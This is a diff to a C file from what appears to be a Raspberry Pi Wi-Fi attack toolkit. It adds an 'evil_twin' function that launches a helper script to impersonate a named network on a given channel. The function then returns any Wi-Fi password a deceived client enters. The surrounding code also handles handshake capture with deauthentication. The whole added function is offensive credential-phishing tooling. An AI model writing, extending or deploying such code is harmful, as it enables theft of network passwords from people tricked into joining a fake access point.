@@ -341,6 +341,53 @@ int wifi_client_beacon(int channel, int seconds,
     return success;
 }
 
+int wifi_client_evil_twin(const char *ssid, const char *bssid, int channel, int seconds,
+                          char *out_password, int pw_size,
+                          char *out_detail, int detail_size) {
+    char *argv_path = PISCAN_WIFI_OPS_PATH;
+    char channel_str[8], seconds_str[8];
+    snprintf(channel_str, sizeof(channel_str), "%d", channel);
+    snprintf(seconds_str, sizeof(seconds_str), "%d", seconds);
+
+    /* wifi_ops.py evil_twin <ssid> <bssid> <channel> <seconds> <iface> */
+    char *argv[] = { "python3", argv_path, "evil_twin", (char *)ssid,
+                     (char *)(bssid ? bssid : ""), channel_str, seconds_str,
+                     "wlan1", NULL };
+
+    char *raw = run_and_capture(argv);
+    if (!raw) {
+        if (out_detail) snprintf(out_detail, detail_size, "no se pudo ejecutar wifi_ops.py");
+        return -1;
+    }
+
+    cJSON *root = cJSON_Parse(raw);
+    free(raw);
+    if (!root) {
+        if (out_detail) snprintf(out_detail, detail_size, "JSON invalido de evil_twin");
+        return -1;
+    }
+
+    cJSON *ok = cJSON_GetObjectItemCaseSensitive(root, "ok");
+    if (!cJSON_IsTrue(ok)) {
+        cJSON *err = cJSON_GetObjectItemCaseSensitive(root, "error");
+        if (out_detail) snprintf(out_detail, detail_size, "%s",
+                                 cJSON_IsString(err) ? err->valuestring : "error en evil_twin");
+        cJSON_Delete(root);
+        return -1;
+    }
+
+    cJSON *captured = cJSON_GetObjectItemCaseSensitive(root, "captured");
+    cJSON *pw = cJSON_GetObjectItemCaseSensitive(root, "password");
+    int got = cJSON_IsTrue(captured) ? 1 : 0;
+    if (got && out_password)
+        snprintf(out_password, pw_size, "%s", cJSON_IsString(pw) ? pw->valuestring : "");
+    if (out_detail && !got)
+        snprintf(out_detail, detail_size, "sin captura (el cliente no ingreso la clave)");
+
+    cJSON_Delete(root);
+    return got;
+}
+
 int wifi_client_handshake(const char *bssid, int channel, int capture_seconds, int deauth_count,
                           char *out_cap_file, int cap_file_size,
                           char *out_detail, int detail_size) {
